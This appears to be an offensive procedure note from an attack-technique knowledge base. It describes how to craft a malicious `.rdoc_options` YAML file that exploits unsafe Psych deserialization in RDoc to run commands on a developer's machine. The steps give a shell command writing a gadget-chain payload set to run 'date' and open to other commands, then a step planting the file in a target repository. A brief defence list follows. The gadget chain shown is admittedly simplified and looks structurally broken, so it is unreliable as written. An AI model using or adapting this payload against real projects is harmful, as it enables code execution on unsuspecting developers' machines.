---
tags:
  - rce
  - deserialization
  - yaml
  - gadget-chain
type: procedure
tools:
  - '[[tools/rdoc]]'
  - '[[tools/psych]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Ruby
techniques:
  - '[[Exploitation for Client Execution]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1bcf2877-06f7-41d6-8043-7d6bece24c19
created_at: '2025-12-14T17:23:42.456Z'
updated_at: '2025-12-14T17:23:42.456Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Create-Malicious-rdoc_options-File

## Summary

This procedure crafts a malicious `.rdoc_options` YAML file using a deserialization gadget chain to enable arbitrary object injection and RCE when processed by RDoc.

## Description

The vulnerability stems from `Psych::YAML.load_file` in RDoc without class whitelisting, allowing restoration of arbitrary Ruby objects. The gadget chain exploits interdependencies in Ruby's Gem and Net libraries to reach `Kernel.system` for command execution (e.g., 'date'). Place this file in an untrusted repository directory to trick RDoc into deserializing it during documentation generation, leading to RCE on the developer's machine.

## Requirements

1. Knowledge of Ruby YAML gadgets (e.g., from ysoserial for Ruby)
2. Text editor or scripting capability in the target directory
3. Vulnerable RDoc/Psych setup

## Defense

Defensive measures and detection strategies:

- Enable safe YAML loading with `YAML.safe_load_file`
- Scan repositories for suspicious .rdoc_options files
- Use git hooks to block malicious YAML

## Objectives

1. Inject deserialization payload for object restoration
2. Chain gadgets to invoke system commands
3. Prepare file for RDoc triggering

## Instructions

### Step 1: Construct Gadget Chain YAML

**Context**: Build the YAML structure using classes like Gem::Installer, Gem::SpecFetcher, Gem::Requirement, Gem::Package::TarReader, Net::BufferedIO, Gem::Package::TarReader::Entry, Net::WriteAdapter, Gem::RequestSet to ultimately call `Kernel.system 'date'` (customize command).

**Command** (Manual file creation):
```bash
echo "--- !ruby/object:Gem::RequestSet\n  deps:\n  - !ruby/object:Gem::Dependency\n      name: malicious\n      type: :development\n      prerelease: true\n      version_requirements: !ruby/object:Gem::Requirement\n        requirements:\n          !ruby/object:Net::WriteAdapter\n            socket: !ruby/object:Gem::Package::TarReader\n              io: !ruby/module 'Kernel'\n                system: date" > .rdoc_options
```

> This creates a simplified gadget; use full validated chain from exploits. Validate with `ruby -ryaml -e "YAML.load_file('.rdoc_options')"` (expect error or execution if triggered).

### Step 2: Place in Target Directory

**Context**: Ensure the file is in the root of the Ruby project or repository to be parsed by RDoc.

**Command** (File placement):
```bash
mv .rdoc_options /path/to/untrusted/repo/
```

> Positions the payload for automatic loading.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/rdoc]]
- [[tools/psych]]

## Tags

- rce
- yaml
- gadget-chain
